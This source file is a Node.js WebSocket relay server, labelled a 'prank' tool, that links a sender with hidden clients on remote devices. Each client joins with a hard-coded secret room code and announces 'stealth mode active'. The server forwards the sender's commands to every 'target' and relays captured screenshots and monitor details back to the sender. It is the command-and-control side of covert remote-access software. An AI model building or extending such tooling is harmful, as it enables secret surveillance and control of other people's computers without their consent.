/**
 * Prank Relay Server - Cloud relay for Remote Friend Messenger
 * Forwards messages between sender (USA) and client (Sweden)
 */

const WebSocket = require('ws');
const express = require('express');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Store active connections by room code
const rooms = new Map();

// Secret room code hardcoded in both client and sender apps
const PRANK_ROOM_CODE = 'PRANK_ROOM_XYZ123_SECRET';

console.log('🚀 Prank Relay Server starting...');
console.log('🔐 Room Code:', PRANK_ROOM_CODE);

// Health check endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'Prank Relay Server Online',
    activeRooms: rooms.size,
    timestamp: new Date().toISOString()
  });
});

// WebSocket connection handler
wss.on('connection', (ws, req) => {
  const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
  ws.ip = ip;
  console.log('📡 New connection from:', ip);
  
  let clientInfo = null;

  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data.toString());
      console.log('📨 Received message:', message.type, 'from', ws.deviceLabel || ws.ip || req.socket.remoteAddress);

      switch (message.type) {
        case 'sender_join':
          handleSenderJoin(ws, message);
          break;
        
        case 'client_join':
          handleClientJoin(ws, message);
          break;
        
        case 'prank_message':
          handlePrankMessage(ws, message);
          break;
        
        case 'monitor_info':
          handleMonitorInfo(ws, message);
          break;

        case 'screenshot_result':
          handleScreenshotResult(ws, message);
          break;
        
        case 'ping':
          ws.send(JSON.stringify({ type: 'pong' }));
          break;
        
        default:
          console.log('❓ Unknown message type:', message.type);
      }
    } catch (error) {
      console.error('❌ Error parsing message:', error);
    }
  });

  ws.on('close', () => {
    console.log('📴 Connection closed from:', ws.deviceLabel || ws.ip || req.socket.remoteAddress);
    if (clientInfo) {
      handleDisconnection(clientInfo);
    }
  });

  ws.on('error', (error) => {
    console.error('❌ WebSocket error:', error);
  });

  function handleSenderJoin(ws, message) {
    const { roomCode } = message;
    
    if (roomCode !== PRANK_ROOM_CODE) {
      ws.send(JSON.stringify({ type: 'error', message: 'Invalid room code' }));
      return;
    }

    if (!rooms.has(roomCode)) {
      rooms.set(roomCode, { sender: null, clients: [] });
    }

    const room = rooms.get(roomCode);
    room.sender = ws;
    
    clientInfo = { type: 'sender', roomCode };
    
    console.log('🎮 Sender joined room:', roomCode);
    
    // Send current client count to sender
    broadcastClientCount(roomCode);
    
    // If clients are already waiting, notify sender
    if (room.clients.length > 0) {
      ws.send(JSON.stringify({ 
        type: 'target_acquired',
        message: `${room.clients.length} target(s) online and ready for pranks! 🎯`
      }));
    } else {
      ws.send(JSON.stringify({ 
        type: 'waiting_for_target',
        message: 'Waiting for targets to come online...'
      }));
    }
  }

  function handleClientJoin(ws, message) {
    const { roomCode, clientId, deviceType, deviceName, platform } = message;
    
    // Build descriptive device label (e.g. "Android (Samsung Galaxy S22) [id: 7a8b9c1d]")
    const shortId = clientId ? clientId.substring(0, 8) : 'unknown';
    const typeLabel = deviceType || (platform ? `Desktop (${platform})` : 'Client');
    const nameLabel = deviceName ? ` (${deviceName})` : '';
    const deviceLabel = `${typeLabel}${nameLabel} [id: ${shortId}]`;
    ws.deviceLabel = deviceLabel;
    ws.deviceInfo = { deviceType, deviceName, platform, clientId };
    
    if (roomCode !== PRANK_ROOM_CODE) {
      ws.send(JSON.stringify({ type: 'error', message: 'Invalid room code' }));
      return;
    }

    if (!rooms.has(roomCode)) {
      rooms.set(roomCode, { sender: null, clients: [] });
    }

    const room = rooms.get(roomCode);

    // Save clientId on ws object
    ws.clientId = clientId || null;
    ws.roomCode = roomCode;

    // Prune dead sockets and any old socket with the same clientId or same instance
    const remainingClients = [];
    for (const c of room.clients) {
      if (c === ws) {
        continue;
      }
      if (c.readyState !== WebSocket.OPEN) {
        try { c.terminate(); } catch (_) {}
        continue;
      }
      if (clientId && c.clientId === clientId) {
        console.log(`🔄 Client ${clientId} reconnected. Terminating previous stale connection.`);
        try { c.terminate(); } catch (_) {}
        continue;
      }
      remainingClients.push(c);
    }
    room.clients = remainingClients;
    room.clients.push(ws);
    
    clientInfo = { type: 'client', roomCode, clientId, deviceLabel, ws: ws };
    
    console.log(`🎯 Client joined room: ${roomCode} -> ${deviceLabel} (${room.clients.length} total clients online)`);
    
    // Notify client that connection is established
    ws.send(JSON.stringify({ 
      type: 'connected',
      message: 'Connected to relay server - stealth mode active'
    }));

    // Update client count for sender
    broadcastClientCount(roomCode);

    // If sender is waiting, notify them that target is acquired
    if (room.sender) {
      room.sender.send(JSON.stringify({ 
        type: 'target_acquired',
        message: `${room.clients.length} target(s) acquired! Ready to prank! 🎯`
      }));
    }
  }

  function handlePrankMessage(ws, message) {
    if (!clientInfo || clientInfo.type !== 'sender') {
      ws.send(JSON.stringify({ type: 'error', message: 'Only senders can send prank messages' }));
      return;
    }

    const room = rooms.get(clientInfo.roomCode);
    if (!room || room.clients.length === 0) {
      ws.send(JSON.stringify({ type: 'error', message: 'No targets connected' }));
      return;
    }

    // Forward the prank message to ALL clients, pruning dead ones and deduplicating by clientId
    const seenClients = new Set();
    const activeClients = [];
    for (const c of room.clients) {
      if (c.readyState !== WebSocket.OPEN) {
        try { c.terminate(); } catch (_) {}
        continue;
      }
      if (c.clientId) {
        if (seenClients.has(c.clientId)) {
          console.log(`⚠️ Dropping duplicate socket for clientId: ${c.clientId}`);
          continue;
        }
        seenClients.add(c.clientId);
      }
      activeClients.push(c);
    }
    room.clients = activeClients;

    console.log(`💥 Broadcasting prank: ${message.payload.type} to ${room.clients.length} clients`);
    
    let deliveredCount = 0;
    room.clients.forEach((client, index) => {
      try {
        client.send(JSON.stringify({
          type: 'prank_message',
          payload: message.payload
        }));
        deliveredCount++;
      } catch (error) {
        console.log(`❌ Failed to send to client ${index + 1}:`, error.message);
      }
    });

    // Confirm delivery to sender
    ws.send(JSON.stringify({ 
      type: 'prank_delivered',
      message: `Prank delivered to ${deliveredCount}/${room.clients.length} targets! 💥`
    }));
  }

  function handleMonitorInfo(ws, message) {
    // This is a response from client to sender about monitor information
    if (!clientInfo || clientInfo.type !== 'client') {
      return;
    }

    const room = rooms.get(clientInfo.roomCode);
    if (!room || !room.sender) {
      return;
    }

    console.log(`🖥️ Forwarding monitor info from client to sender`);
    
    try {
      room.sender.send(JSON.stringify({
        type: 'monitor_info',
        monitors: message.monitors
      }));
    } catch (error) {
      console.log(`❌ Failed to forward monitor info to sender:`, error.message);
    }
  }

  function handleScreenshotResult(ws, message) {
    if (!clientInfo || clientInfo.type !== 'client') {
      return;
    }

    const room = rooms.get(clientInfo.roomCode);
    if (!room || !room.sender) {
      return;
    }

    console.log(`📸 Forwarding screenshot from client to sender`);

    try {
      room.sender.send(JSON.stringify({
        type: 'screenshot_result',
        data: message.data,
        timestamp: message.timestamp
      }));
    } catch (error) {
      console.log(`❌ Failed to forward screenshot to sender:`, error.message);
    }
  }

  function broadcastClientCount(roomCode) {
    const room = rooms.get(roomCode);
    if (!room || !room.sender) return;
    
    const clientCount = room.clients.length;
    console.log(`📊 Broadcasting client count: ${clientCount} to sender`);
    
    const devices = room.clients.map(c => c.deviceLabel || c.clientId || 'Unknown Device');
    room.sender.send(JSON.stringify({
      type: 'client_count',
      count: clientCount,
      devices: devices
    }));
  }

  function handleDisconnection(info) {
    const room = rooms.get(info.roomCode);
    if (!room) return;

    if (info.type === 'sender') {
      room.sender = null;
      console.log('🎮 Sender disconnected from room:', info.roomCode);
      
      // Notify all clients that sender is gone
      room.clients.forEach((client, index) => {
        try {
          client.send(JSON.stringify({ 
            type: 'sender_disconnected',
            message: 'Sender disconnected - entering standby mode'
          }));
        } catch (error) {
          console.log(`❌ Failed to notify client ${index + 1} of sender disconnect`);
        }
      });
    } else if (info.type === 'client') {
      // Remove the specific client from the array and clean up dead sockets
      room.clients = room.clients.filter(client => client !== info.ws && client.readyState === WebSocket.OPEN);
      
      console.log(`🎯 Client disconnected from room: ${info.roomCode} -> ${info.deviceLabel || info.clientId || 'unknown'} (${room.clients.length} remaining)`);
      
      // Update client count for sender
      broadcastClientCount(info.roomCode);
      
      // Notify sender about remaining targets
      if (room.sender) {
        if (room.clients.length > 0) {
          room.sender.send(JSON.stringify({ 
            type: 'target_update',
            message: `${room.clients.length} target(s) remaining`
          }));
        } else {
          room.sender.send(JSON.stringify({ 
            type: 'target_lost',
            message: 'All targets disconnected - waiting for reconnection...'
          }));
        }
      }
    }

    // Clean up empty rooms
    if (!room.sender && room.clients.length === 0) {
      rooms.delete(info.roomCode);
      console.log('🧹 Cleaned up empty room:', info.roomCode);
    }
  }
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🌐 Prank Relay Server running on port ${PORT}`);
  console.log(`🔗 WebSocket endpoint: ws://localhost:${PORT}`);
  console.log('💀 Ready to facilitate international pranks!');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 Shutting down relay server...');
  server.close(() => {
    console.log('✅ Server shut down gracefully');
    process.exit(0);
  });
});
